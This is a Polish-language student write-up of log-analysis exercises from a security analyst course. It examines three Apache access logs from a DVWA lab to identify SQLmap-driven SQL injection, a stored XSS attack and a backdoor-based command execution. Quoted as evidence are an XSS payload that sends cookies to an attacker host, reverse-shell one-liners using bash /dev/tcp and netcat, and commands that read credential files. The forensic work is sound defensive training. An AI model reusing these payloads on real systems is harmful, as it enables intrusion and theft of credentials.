
## 1access.log

1. **Jak duży jest plik logów?** 
Używamy popularnych komend do sprawdzania wielkości plików/folderów: **du i ls**

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/1-image.png)

**Odp. 2840 KB (2.8 Megabajta)**

2. **Jaki zakres czasu jest zawarty w logach?** 
Używamy dwóch komend - head i tail do sprawdzenia początku i końca logów.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/2-image.png)

**Odp. 24/May/2022:04:13:49 +0200 UTC - 24/May/2022:05:27:40 +0200 UTC****

3. **W jakim forcie jest plik logów oraz, którego pliku jest kopią?** 

Sprawdzamy sobie pierwsze 20 pozycji za pomocą head, by zweryfikować jaki mamy format:

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/3-image.png)

Odp. **Format: *apache combined* - na końcu ma Referrer i User-Agent w cudzysłowach**

htxps://httpd.apache.org/docs/2.4/logs.html

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/4-image.png)

**Plik jest kopią: *other_vhost_access.log* - zwykle ten plik zaczyna się od nazwy hosta (wirtualnego) - dopiero potem IP.**

4. **Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu?** 

Użyjemy komendy cat 1access.log | cut -d' ' -f2 | sort | uniq -c - wyodrębnia ona adresy z pola drugiego, zlicza je i pokazuje, ile żądań wysłał każdy adres. Zlicza ona adresy IP na całym pliku także zakres czasu już wcześniej powinien być zawężony do odpowiedniego fragmentu.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/5-image.png)

**Odp. Ilość 12898. Wysyłał tylko jeden adres IP: 30.13.3.7**

5. **Jakie zasoby URI były najczęściej odwiedzane w analizowanym zakresie czasu? (podaj ilość wysłanych top5 żądań)** 

W tym celu użejemy komendy **cat 1access.log | cut -d' ' -f8 | sort | uniq -c | sort -nr | head -5**. Komenda ta wyciąga wartość ósmej kolumny z logu **(żądane zasoby URI)**, sprawdza ile razy każdy z nich wystąpił i pokazuje 5 najczęściej odwiedzanych URI wraz z liczbą żądań.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/7-image.png)

**Odp:**
	6344 /vulnerabilities/sqli/index.php
     10 /vulnerabilities/sqli/?id=1&Submit=Submit
      5 /vulnerabilities/sqli/?id=1%27%20ORDER%20BY%201%23&Submit=Submit
      4 /vulnerabilities/sqli/?id=1&Submit=Submit%27%20ORDER%20BY%201%23
      4 /login.php

6. **Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.** 
   
Z kursu wiemy, że do tego możemy użyć komendy **cat 1access.log | cut -d'"' -f6 | sort | uniq -c | sort** Szósta kolumna pokazuje nam zawiera wartości pola `User-Agent`. Możemy tak sprawdzić jakie narzędzia, przeglądarki lub skrypty były używane do komunikacji z aplikacją oraz wskazać nietypowe lub charakterystyczne wpisy mogące należeć do atakującego.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/8-image.png)

Możemy założyć że atakujący użył narzędzia SQLmap.** (nawet widać wersję narzędzia 1.5.1) Nie jest to niezbity dowód, bo można to podrobić. Ale - by się jeszcze upewnić - możemy sprawdzić typowe payloady SQL:

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/9-image.png)

Albo czy techniki SQLi pojawiły się w krótkim czasie:

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/10-image.png)
To polecenie wyszukuje typowe ślady SQLi, wyciąga timestampy z logów, grupuje zdarzenia do minuty, i wyrzuca kiedy było najwięcej podejrzanych zapytań. Tutaj mamy takich śladów mnóstwo, więc nasza teoria się potwierdza.

**Odp. Atakujący użył narzędzia SQLmap.**

7. Jaką technikę ataku na aplikację webową wykorzystano? 

Wyjmijmy sobie pierwsze 25 linikek z logów:

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/11-image.png)

Już we wczesniejszym pytaniu wyodrębniliśmy jakiego narzędzia użył atakujący. Te narzędzie jest używane do SQL Injection. 

Odp. Jest to technika **SQL Injection**

8. **Przeanalizuj ruch manualny do aplikacji webowej. Zidentyfikuj kroki atakującego. Ilokrotnie i kiedy nastąpiło zalogowanie się do aplikacji?**

Grepujemy User-Agentów, które zawierają informacje o przeglądarce. Robię to po to, odsiać normalne wejścia z przeglądarki od ruchu generowanego przez narzędzie atakujące.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/12-image.png)

Widać tutaj **dwa momenty**:
dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

Oraz 

dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[].com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

W przefiltrowanym ruchu widzimy dwa żądania **POST /login.php,** po których pojawia się przekierowanie `302`i wejście na `index.php`, co zwykle oznacza udane zalogowanie.

https://jakwybrachosting.pl/przekierowanie-302/

## 2access.log

1. **Jak duży jest plik logów?** 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/13-image.png)

**Odp. 7.1KB.

2. **Jaki zakres czasu jest zawarty w logach?** 
   
![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/14-image.png)

**Odp. 
od 24/May/2022:06:24:31 +0200 UTC 
do 24/May/2022:06:31:10 +0200 UTC**

3. **W jakim for(ma)cie jest plik logów oraz, którego pliku jest kopią?** 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/15-image.png)

**format apache combined - kopia access.log**

4. Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu? 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/16-image.png)

**Odp. 2 adresy - 30.13.3.7 i  30.2.13.37**

5. **Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.** 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/17-image.png)

**Odp: na podstawie parametrów useragent nie widać żadnych narzędzi które zostały użyte w ataku.**
37 Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

6. Przeanalizuj ruch do różnych uri oraz odstęp czasu pomiędzy wysyłanymi żądaniami. Czy atakujący wykonywał atak manualnie? 

Użyjemy do tego komendy **cat 2access.log | cut -d"[" -f2 | cut -d" " -f1,4

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/18-image.png)

Wygląda to na manualny atak - na screenie widać zwykły browser flow czyli: 
- wejście na /index.php i natychmiastowe dociąganie CSS/JS/obrazów;
- potem przejście do konkretnego modułu /vulnerabilities/xss_s/;
- Do tego mamy przerwy czasowe po kilkadziesiąt sekund, a nie setki żądań na minutę.

**Odp. nie mamy 100% pewności, ale wszystko na to wskazuje że to manualny atak.**

7. **Jaką technikę ataku na aplikację webową wykorzystano?** 

**grep -Eio 'script|img+src' 2access.log | sort | uniq -c | sort -nr**
Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "script"

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)

**Atakujący wstrzyknął: "3Edocument.write%28%27%3Cimg+src%3D%22htxp%3A%2F%2F30.13.3.7%3A8000%2Fcollect.gif%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3"**

**Odp. XSS.**

8. **Kiedy atakujący wykonał atak?** 
   
![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)

**Odp. 24/May/2022:06:26:55 UTC**

9. **Jakie informacje uzyskałby atakujący w przypadku powodzenia ataku?**

Bazując na poprzednim screenie: możemy odszyfrować wiadomość w Cyberchefie.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/20-image.png)

Powyższy kod wskazuje nam takie rzeczy jak
- odczytywanie document.cookie

(https://webref.pl/arena/html5/domhtml5_document_cookie.html)

- stworzenie elementu (document.write) - czyli obrazka i wysyłanie żadania na serwer atakującego, cookie= dokleja nam tutaj ciasteczka ofiary.
  
**Odp. Jeśli atak by się powiódł, atakujący uzyskałby cookies użytkownika dostępne z JS.**

## 3access.log

1. Jak duży jest plik logów? 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/21-image.png)

**Odp. **Size: 11706 - 12 K**

2. Jaki zakres czasu jest zawarty w logach? 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/23-image.png)

Odp. **24/May/2022:08:11:21 +0200 do 24/May/2022:09:52:03 +0200**

3. W jakim forcie jest plik logów oraz, którego pliku jest kopią? 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)

**Widzimy tu referer - np. "htxp://dvwa[.]com/vulnerabilities/fi/?page=include.php"**

https://www.ibm.com/docs/en/webmethods-integration/wm-integration-server/11.1.0?topic=log-combined-format

**Odp. apache combined - Other_vhost_access.log**

4. Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu? 

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/26-image.png)

Odp. **1 adres, 30.13.3.7**

5. Przeanalizuj zalogowane parametry useragent. Zidentyfikuj użyte przez atakującego narzędzia.

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/27-image.png)

Widzimy tutaj dwa parametry user-agent: przeglądarki oraz "Majkrosoft Edze 100"

Odp. **nie da się dokłądnie określiść - nazwa narzędzia została prawdopodobnie podrobiona na “Majkrosoft Edze 100”**

6. **Z jakiego kraju najprawdopodobniej pochodzi atakujący? (albo chce, żebyśmy tak myśleli)** 

**Odp. Nie możemy tego wywnioskować z tych logów na 100%. Jedyne "clue" z tego wszystkiego to podrobiona nazwa useragenta (spolszczona) - "Majkrosoft Edze" trochę w stylu polskiej wymowy, więc zamierzeniem atakującego było sprawiać wrażenie osoby polskojęzycznej. Czyli najprwadopodniej z Polski.** 

7. Przeanalizuj ruch dotyczący niecodziennego parametru useragent? Czy widzisz w nim coś niepokojącego? 

**Odp.** **Parametry Useragent wygląda jak celowo zmyślona lub ręcznie ustawiona nazwa - z Mozilli (przeglądarki) na Majkrosoft Edze. Pojawia się przy żądaniach, które same w sobie są podejrzane (odwołania do simple-backdoor, parametry cmd=ls itp.). 

8. Jakie 3 techniki ataku potrafisz zidentyfikować na podstawie ruchu z poprzedniego zadania? 

**cat 3access.log | grep "Majkrosoft Edze 100"

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/22-image.png)

**Odp:
- **Remote Code Execution (wykonywanie komend)** – w logach widać parametry command line np. **ls /, whoami, cat /home/vulcan/.bash_history**. Atakujący wpisywał komendy, a serwer je wykonywał.
- **LFI (wczytanie lokalnego pliku)** – w żądaniu **page=../../hackable/uploads/simple-backdoor.php** widać że aplikacja ładuje plik wskazany przez użytkownika. Atakujący próbował wczytać plik backdoora z serwera.
- **Path Traversal (wyjście poza normalny folder)** – atakujący cofał się po folderach przez ../.., by wejść tam, gdzie normalnie nie powinien mieć wstępu.

9. **Jakie komendy zostały wykonane przez atakującego na serwerze?** 

**Użyjemy zmodyfikowanego grepa:** 
cat 3access.log | grep 'cmd=' | cut -d'"' -f2 | cut -d'=' -f3 | cut -d' ' -f1

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/31-image.png)

Trzeba jeszcze odkodować w CyberChefie:

![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/29-image.png)

**Odp.** 
- cat /etc/passwd
- cat ls /
- ls /
- whoami
- ls /home
- ls /home/vulcan
- ls -a /home/vulcan
- cat /home/vulcan/.bash_history
- ls -lah /home/vulcan/Documents
- cat /home/vulcan/Documents/passwords.txt
- ip neigh
- ssh admin@10.0.0.20 'ls'
- bash -i >& /dev/tcp/30.13.3.7/1337 0>&1
- bash -i >& /dev/tcp/30.13.3.7/80 0>&1
- nc -e /bin/sh 30.13.3.7 1337
- nc -e /bin/sh 30.13.3.7 80
- bin/sh | nc 30.13.3.7 1337
- /bin/sh | nc 30.13.3.7 80
- /bin/sh | nc 30.13.3.7 1337
- bin/sh | nc 30.13.3.7 4444
- bash -i | nc 30.13.3.7 5555
- bash -i 2>&1 | nc 30.13.3.7 5555
- bash -i 2>&1 | nc 30.13.3.7 6666
- /bin/sh 2>&1 | nc 30.13.3.7 6666
- /bin/sh 2>&1 | nc 30.13.3.7 7777
- printf "open 10.0.0.20\nuser admin admin\nls\nbye\n" | ftp -n
- printf "open 10.0.0.20\nuser admin admin\nget flag.txt -\nbye\n" | ftp -n

10. **Opisz słownie kroki atakującego na podstawie wykonanych komend.**

**Odp:
1. Atakujący próbował wyszukać obecnych użytkowników (etc/passwd)
2. Wyświetlił katalog główny, Jakie są katalogi w /home
3. Jaki jest użytkownik
4. Sprawdził foldery, pliki, historię komend konta vulcan
5. Sprawdził sąsiednie hosty w sieci lokalnej, żeby zobaczyć, z jakimi adresami IP system się komunikował
6. Spróbował połączyć się po SSH z hostem `10.0.0.20` na konto `admin` i wykonać prostą komendę `ls`, czyli testował dalszy ruch boczny
7. Spróbował otworzyć reverse shell do swojego hosta `30.13.3.7` na porcie `1337`
8. Ponowił próbę reverse shella, ale na porcie `80`, pewnie licząc, że ten port będzie mniej blokowany
9. Potem spróbował uzyskac reverse shell przy użyciu `netcat` i `/bin/sh` na porcie `1337`. Potem zrobił to samo, ale na porcie `80`
10. Próba przesłania powloki `/bin/sh` do hosta atakującego przez `nc` na porcie `80`. Potem zrobił to samo, ale na porcie `1337`
11. Potem kolejna próba reverse shella, tym razem na porcie `4444`
12. Próba wysłania interaktywnej powłoki `bash` do atakującego na porcie `5555`
13. Kolejna próba reverse shella, już z przekierowaniem błędów i wyjścia, żeby działało pełniej. Potem zrobił to samo, ale na porcie `6666`.
14. Analogiczna próba z `/bin/sh` zamiast `bash`, na porcie `6666`
15. Atakujący spróbował zalogować się przez FTP do hosta `10.0.0.20` danmi `admin/admin` i wyświetlić zawartość katalogu
16. Następnie przez FTP próbował pobrać plik `flag.txt` z tego samego hosta

Atakujący najpierw chciał rozponać system a potem szukał danych i haseł.

Następnie próbował przemieszczać się dalej w sieci do hosta 10.0.0.20 i potem wielokrotnie próbował uzyskać zdalną powłokę reverse shell żeby przejąć wygodniejszą kontrolę nad systemem i pobrać interesujące go pliki - w tym "flag.txt". Trochę wygląda jak kopia komend z CTFa :)

